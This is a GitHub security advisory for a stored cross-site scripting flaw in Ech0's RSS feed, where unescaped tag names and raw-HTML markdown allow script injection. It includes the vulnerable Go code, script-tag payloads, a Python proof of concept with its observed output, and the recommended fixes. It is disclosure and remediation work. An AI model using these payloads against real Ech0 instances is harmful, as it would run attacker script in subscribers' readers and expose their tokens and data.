# [M] Ech0's RSS feed renders unescaped tag names and raw-HTML markdown, stored XSS against subscribers

## Summary
Severity: Medium
Advisory: GHSA-3v85-fqvh-7rxf
CWE: CWE-116, CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-3v85-fqvh-7rxf
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/Ech0` — affected >=0 <1.4.8-0.20260503035519-fd320fe3e902

## Details
## Summary

The public RSS/Atom feed at `/rss` renders two attacker-controlled surfaces without HTML escaping. Tag names flow through `fmt.Appendf(renderedContent, "<br /><span class=\"tag\">#%s</span>", tag.Name)` at `internal/service/common/common.go:120`, and the Markdown renderer at `internal/util/md/md.go` does not set the `html.SkipHTML` flag, so raw HTML blocks in echo content pass through unmodified. The resulting Atom `<summary type="html">` is valid XML but contains executable `<script>` tags after the RSS reader decodes it. RSS subscribers whose readers render HTML (including many self-hosted and desktop clients) execute attacker JavaScript in the reader's origin.

## Details

Tag sink at `internal/service/common/common.go:120`:

```go
if len(msg.Tags) > 0 {
    for _, tag := range msg.Tags {
        renderedContent = fmt.Appendf(renderedContent,
            "<br /><span class=\"tag\">#%s</span>", tag.Name)
    }
}
```

`fmt.Appendf` with `%s` does not HTML-escape. Tag names come from user-supplied `EchoUpsertDto.Tags` and are persisted after `strings.TrimSpace(strings.TrimPrefix(tag.Name, "#"))` at `internal/service/echo/echo.go:326`, which strips a leading `#` and trims whitespace but does nothing about HTML metacharacters. A tag name of `</span><script>document.title='RSS-XSS-HIT'</script><span>x` breaks out of the surrounding `<span>` element and injects executable JavaScript into the RSS `summary` field.

Markdown sink at `internal/util/md/md.go`:

```go
htmlFlags := html.CommonFlags | html.Safelink | html.HrefTargetBlank |
             html.NoopenerLinks | html.NoreferrerLinks
// html.SkipHTML is NOT set
```

The `gomarkdown` library passes raw HTML through when `SkipHTML` is not set. `MdToHTML([]byte(msg.Content))` at `internal/service/common/common.go:102` produces the rendered HTML for the echo body; tag markup is appended to that output at line 120 and the combined byte slice becomes the RSS `summary` field.

The RSS feed declares `<summary type="html">`, which per Atom RFC 4287 §3.1.1.3 means the content is HTML encoded as XML. RSS readers that render HTML decode the XML entities and pass the decoded string to an HTML renderer. Any script tag survives this round-trip.

Echo creation requires admin role (`internal/service/echo/echo.go:54-56` checks `user.IsAdmin`). In a single-admin Ech0 instance this is self-attack. In a multi-admin deployment (non-owner admins promoted by the owner), one admin injects XSS into the shared RSS feed consumed by other admins, registered users, and anonymous subscribers.

Prior precedent: GHSA-69hx-63pv-f8f4 (2026-04-09) accepted stored XSS via SVG file upload, with the same "admin creates content" precondition. Cross-subscriber RSS XSS from one admin belongs to the same class.

## Proof of Concept

Default install, admin account seeds malicious tag + markdown content, anonymous subscriber fetches `/rss` and the decoded summary contains executable `<script>`:

```python
import requests, xml.etree.ElementTree as ET, html
TARGET = "http://localhost:8300"

# Admin creates two echoes: one with a hostile tag name, one with raw-HTML markdown.
owner = requests.post(f"{TARGET}/api/login",
                      json={"username": "owner", "password": "owner-pw"}
                     ).json()["data"]["access_token"]

tag_payload = "</span><script>document.title='RSS-XSS-HIT'</script><span>x"
md_payload = "<script>document.title='MD-XSS-HIT'</script>normal text"

requests.post(f"{TARGET}/api/echos",
              headers={"Authorization": f"Bearer {owner}",
                       "content-type": "application/json"},
              json={"content": "echo with malicious tag",
                    "tags": [tag_payload]})

requests.post(f"{TARGET}/api/echos",
              headers={"Authorization": f"Bearer {owner}",
                       "content-type": "application/json"},
              json={"content": md_payload})

# Anyone fetches /rss anonymously.
feed = requests.get(f"{TARGET}/rss").text
root = ET.fromstring(feed)
ns = {"atom": "http://www.w3.org/2005/Atom"}
for entry in root.findall("atom:entry", ns):
    summary = entry.find("atom:summary", ns)
    decoded = html.unescape(summary.text or "")
    if "<script>" in decoded.lower():
        print(f"  *** EXECUTABLE <script> in decoded summary ***")
        print(f"    raw:     {(summary.text or '')[:200]!r}")
        print(f"    decoded: {decoded[:200]!r}")
```

Observed on v4.5.6:

```
*** EXECUTABLE <script> in decoded summary ***
  raw:     "<p><script>document.title=&lsquo;MD-XSS-HIT&rsquo;</script>normal text</p>\n"
  decoded: "<p><script>document.title='MD-XSS-HIT'</script>normal text</p>\n"
*** EXECUTABLE <script> in decoded summary ***
  raw:     '<p>echo with malicious tag</p>\n<br /><span class="tag">#</span><script>document.title=\'RSS-XSS-HIT\'</script><span>x</span>'
  decoded: '<p>echo with malicious tag</p>\n<br /><span class="tag">#</span><script>document.title=\'RSS-XSS-HIT\'</script><span>x</span>'
```

Two separate `<script>` tags land in the public RSS feed: one via the tag-name sink, one via the markdown raw-HTML sink. Any RSS reader that decodes `type="html"` content and renders the HTML (common in self-hosted readers like Tiny Tiny RSS and FreshRSS's default settings, and in several desktop readers) executes the script.

## Impact

A non-owner admin with echo-creation rights (or the owner themselves if RSS pushes to subscribers the owner did not hand-pick) injects persistent JavaScript into the public RSS feed. The RSS feed reaches:

- **Anonymous subscribers** who follow the blog's RSS URL in their reader.
- **Registered non-admin users** who may subscribe to the feed.
- **Other admins** on the same instance.

Each subscriber whose reader renders `type="html"` content runs the attacker's script in the reader's origin. Depending on the reader, the payload:

- Reads the reader's own UI tokens and exfiltrates them.
- Makes authenticated requests to other feeds the reader polls (cross-feed data theft).
- Plants phishing content that looks like a legitimate feed entry.

The class is stored XSS with cross-user reach. Severity compared to GHSA-69hx-63pv-f8f4 (SVG-upload stored XSS, accepted as Medium): reach is similar (anonymous subscribers via a published feed URL), and the admin precondition matches.

## Recommended Fix

Two independent fixes, both needed.

Tag names: HTML-escape before interpolation.

```go
for _, tag := range msg.Tags {
    renderedContent = fmt.Appendf(renderedContent,
        "<br /><span class=\"tag\">#%s</span>", html.EscapeString(tag.Name))
}
```

Markdown: add `html.SkipHTML` to the renderer flags so raw HTML in echo markdown is stripped.

```go
htmlFlags := html.CommonFlags |
             html.Safelink |
             html.HrefTargetBlank |
             html.NoopenerLinks |
             html.NoreferrerLinks |
             html.SkipHTML
```

Validate tag names at creation time too. A central validator in `EchoService.Create` that rejects tags containing `<`, `>`, or `"` removes the attacker payload before it reaches the DB:

```go
for _, name := range newEcho.Tags {
    if strings.ContainsAny(name, "<>\"'&") {
        return errors.New(commonModel.INVALID_TAG_NAME)
    }
}
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-3v85-fqvh-7rxf
- https://github.com/lin-snow/Ech0/commit/fd320fe3e9021c8d8d284fb274775c018690520e
- https://github.com/lin-snow/Ech0
